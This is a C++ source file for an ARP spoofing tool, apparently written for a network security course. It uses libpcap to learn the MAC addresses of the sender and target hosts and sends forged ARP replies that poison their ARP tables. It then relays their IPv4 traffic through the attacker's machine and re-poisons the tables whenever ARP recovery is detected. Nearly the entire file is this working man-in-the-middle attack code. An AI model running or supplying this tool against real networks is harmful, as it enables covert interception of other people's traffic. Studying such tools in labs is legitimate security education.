#include <cstdio>
#include <pcap.h>
#include "ethhdr.h"
#include "arphdr.h"
/*Adding header due to mac address*/
/*https://tttsss77.tistory.com/138*/
/*https://technote.kr/176*/
#include <net/if.h>
#include <net/if_arp.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <stdint.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>
//add ip header
#include "iphdr.h"
//dynamic allocated
#include <stdlib.h>
#include <malloc.h>

#define MAC_ALEN 6

#pragma pack(push, 1)
struct EthArpPacket final {
	EthHdr eth_;
	ArpHdr arp_;
};
#pragma pack(pop)

void usage() {
	printf("arp-spoof <interface> <sender ip 1> <target ip 1> [<sender ip 2> <target ip 2>...]\n");
	printf("arp-spoof wlan0 192.168.10.2 192.168.10.1 192.168.10.1 192.168.10.2\n");
}

bool AttackerIp(char* device, char* IP_addr)
{
	struct ifreq ifr;
	//char ipstr[40];
	int s;

	s = socket(AF_INET, SOCK_DGRAM, 0);
	strncpy(ifr.ifr_name, device, IFNAMSIZ);

	if (ioctl(s, SIOCGIFADDR, &ifr) < 0) {
		printf("Error");
		return 1;
	} else {
		inet_ntop(AF_INET, ifr.ifr_addr.sa_data+2, IP_addr,sizeof(struct sockaddr));
		//printf("myOwn IP Address is %s\n", IP_addr);
		return 0;
	}
}

bool AttackerMac(char* device, uint8_t *mac_addr)
{
	struct ifreq ifr;
	int sockfd, ret;

	sockfd = socket(AF_INET, SOCK_DGRAM, 0);
	if(sockfd < 0){
		printf("Fail to get interface MAC address - socket() failed - %m\n");
		return 1;
	}
	strncpy(ifr.ifr_name, device, IFNAMSIZ);
	ret = ioctl(sockfd, SIOCGIFHWADDR, &ifr);
	if(ret < 0){
		printf("Fail to get interface MAC address - ioctl(SIOCGIFHWADDR) failed - %m\n");
		close(sockfd);
		return 1;
	}
	memcpy(mac_addr, ifr.ifr_hwaddr.sa_data, MAC_ALEN);

	close(sockfd);
	return 0;
}

void SendBroadcast(pcap_t* handle, uint32_t ip, uint8_t* src_mac, char* src_ip){
	EthArpPacket packet;
	packet.eth_.dmac_ = Mac("ff:ff:ff:ff:ff:ff");
	packet.eth_.smac_ = src_mac;
	packet.eth_.type_ = htons(EthHdr::Arp);

	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet.arp_.pro_ = htons(EthHdr::Ip4);
	packet.arp_.hln_ = Mac::SIZE;
	packet.arp_.pln_ = Ip::SIZE;
	packet.arp_.op_ = htons(ArpHdr::Request);
	packet.arp_.smac_ = src_mac;
	packet.arp_.sip_ = htonl(Ip(src_ip));
	packet.arp_.tmac_ = Mac("00:00:00:00:00:00");
	packet.arp_.tip_ = htonl(ip);

	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
	if (res != 0) {
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
	}
}

void ExtractMac(pcap_t* pcap, uint32_t src_ip, Mac* mac){
	while(true){
		struct pcap_pkthdr* header;
		const u_char* getpacket;
		int res2 = pcap_next_ex(pcap, &header, &getpacket);
		if (res2 == 0) continue;
		if (res2 == PCAP_ERROR || res2 == PCAP_ERROR_BREAK) {
			printf("pcap_next_ex return %d(%s)\n", res2, pcap_geterr(pcap));
			break;
		}
		PEthHdr eth_hdr = (PEthHdr)getpacket;
		PArpHdr arp_hdr = (PArpHdr)((char*)getpacket+sizeof(EthHdr));
		if(eth_hdr->type()==EthHdr::Arp){ //Arp protocol check
			if(arp_hdr->sip()==Ip(src_ip)){ //sender or target ip check
				*mac = arp_hdr->smac();
				break;
			}
		}
	}
}

void InfectionArpTable(pcap_t* handle, Mac sender_mac, Mac attacker_mac, uint32_t sender_ip, uint32_t target_ip){
	EthArpPacket packet;
	packet.eth_.dmac_ = sender_mac;
	packet.eth_.smac_ = attacker_mac;
	packet.eth_.type_ = htons(EthHdr::Arp);

	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet.arp_.pro_ = htons(EthHdr::Ip4);
	packet.arp_.hln_ = Mac::SIZE;
	packet.arp_.pln_ = Ip::SIZE;
	packet.arp_.op_ = htons(ArpHdr::Reply);
	packet.arp_.smac_ = attacker_mac;
	packet.arp_.sip_ = htonl(target_ip);
	packet.arp_.tmac_ = sender_mac;
	packet.arp_.tip_ = htonl(sender_ip);

	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
	if (res != 0) {
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
	}
}

int RelayPacketAndDetect(pcap_t* handle, Mac MacBuffer[][2], uint32_t IpBuffer[][2], Mac attacker_mac, uint32_t attacker_ip, int size){
	while(true){
		struct pcap_pkthdr* header;
		const u_char* getpacket;
		int count=0;
		int flag=0;
		int order=0;
		int res = pcap_next_ex(handle, &header, &getpacket);
		if (res == 0) continue;
		if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
			printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
			break;
		}
		PEthHdr eth_hdr = (PEthHdr)getpacket;
		PIPHeader ip_hdr = (PIPHeader)(getpacket+sizeof(EthHdr));
		if(eth_hdr->type()==EthHdr::Ip4){ //ipv4 check
			order = 0;
			while(true){
				if(eth_hdr->smac()== MacBuffer[count][0] && ntohl((uint32_t)ip_hdr->destinationAddress)==IpBuffer[count][1] && ntohl((uint32_t)ip_hdr->sourceAddress)==IpBuffer[count][0]){
					order=1;
					eth_hdr->smac_ = attacker_mac;
					eth_hdr->dmac_ = MacBuffer[count][1];
					int res1 = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(getpacket), ntohs(ip_hdr->totalLength) + sizeof(EthHdr));
					if (res1 != 0) {
						fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res1, pcap_geterr(handle));
					}
					count=0;
					break;
				}
				else{
					count++;
					if(count>=size){
						count=0;
						break;
					}
				}
			}
			while(true){
				if(order==1){
					break;
				}
				else if(ntohl((uint32_t)ip_hdr->sourceAddress)== IpBuffer[count][0] && ntohl((uint32_t)ip_hdr->destinationAddress)!=attacker_ip){ //When sender send to target(gateway)
					eth_hdr->smac_ = attacker_mac;
					eth_hdr->dmac_ = MacBuffer[count][1];
					int res1 = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(getpacket), ntohs(ip_hdr->totalLength) + sizeof(EthHdr));
					if (res1 != 0) {
						fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res1, pcap_geterr(handle));
					}
					count=0;
					break;
				}
				else if(ntohl((uint32_t)ip_hdr->destinationAddress) == IpBuffer[count][1]){ //When sender(gateway) send to target
					eth_hdr->smac_ = attacker_mac;
					eth_hdr->dmac_ = MacBuffer[count][1];
					int res1 = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(getpacket), ntohs(ip_hdr->totalLength) + sizeof(EthHdr));
					if (res1 != 0) {
						fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res1, pcap_geterr(handle));
					}
					count=0;
					break;
				}
				else{
					count++;
					if(count>=size){
						break;
					}
				}
			}
		}
		else if(eth_hdr->type()==EthHdr::Arp){
			flag = 0;
			while(true){
				if(eth_hdr->smac()==MacBuffer[flag][0] && eth_hdr->dmac()!=Mac("ff:ff:ff:ff:ff:ff")){
					printf("Detect %dth sender's unicast!!!\n", flag+1);
					return flag;
				}
				else if(eth_hdr->smac()==MacBuffer[flag][0] && eth_hdr->dmac()==Mac("ff:ff:ff:ff:ff:ff")){
					printf("Detect broadcast!!!\n");
					return flag;
				}
				else{
					flag++;
					if(flag>=size){
						break;
					}
				} 
			}
		}
	}
	printf("Impossible Area\n");
	return 0;
}

int main(int argc, char* argv[]) {
	if ((argc < 6) && (argc-2)%4!=0) {
		usage();
		return -1;
	}
	char* dev = argv[1];

	//0. Stored Mac address buffer
	int size = (argc - 2)/2; 
	int count = size;
	Mac MacBuffer[size][2];
	uint32_t IpBuffer[size][2];

	//1. Attacker's IP address
	bool flag = 0;
	char attacker_ip[20];
	uint32_t attackerIp;
	flag = AttackerIp(dev, attacker_ip);
	attackerIp = (uint32_t)Ip(attacker_ip);
	printf("%u\n",attackerIp);
	if(flag==1)	return -1;

	//2. Attacker's MAC address
	uint8_t attacker_mac[6];
	flag = AttackerMac(dev, attacker_mac);

	//3. Sender's MAC address & Target's MAC address
	char errbuf[PCAP_ERRBUF_SIZE];
	uint32_t sender_ip; //sender ip raw version
	uint32_t target_ip;//target ip raw version
	Mac sender_mac;
	Mac target_mac;

	pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf); //Send & Receive packet pcap
	if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return -1;
	}
	for(int i=0; i<count; i++){
		sender_ip = Ip(argv[(i+1)*2]); //sender ip raw version
		target_ip = Ip(argv[(i+1)*2+1]);//target ip raw version
		IpBuffer[i][0] = sender_ip;
		IpBuffer[i][1] = target_ip;
		SendBroadcast(handle, sender_ip, attacker_mac, attacker_ip);
		ExtractMac(handle, sender_ip, &sender_mac);
		SendBroadcast(handle, target_ip, attacker_mac, attacker_ip);
		ExtractMac(handle, target_ip, &target_mac);

		MacBuffer[i][0] = sender_mac;
		MacBuffer[i][1] = target_mac;
	}
	sleep(1);
	//4. Infection Arp table
	for(int i=0; i<count; i++){
		InfectionArpTable(handle, MacBuffer[i][0], attacker_mac, IpBuffer[i][0], IpBuffer[i][1]); //infection sender
		printf("Infection!!!\n");		
	}


	//5. Maintain status & relay
	while(true)
	{
		flag = RelayPacketAndDetect(handle, MacBuffer, IpBuffer, attacker_mac, attackerIp, size);
		if(flag%2==1){ //ARP Request's owner is gateway
			for(int i=0; i<count; i++){
			InfectionArpTable(handle, MacBuffer[i][0], attacker_mac, IpBuffer[i][0], IpBuffer[i][1]); //infection sender
			}
		}
		else{
		InfectionArpTable(handle, MacBuffer[flag][0], attacker_mac, IpBuffer[flag][0], IpBuffer[flag][1]); //infection sender
		InfectionArpTable(handle, MacBuffer[flag][1], attacker_mac, IpBuffer[flag][1], IpBuffer[flag][0]);
		}
	}

	pcap_close(handle);
}
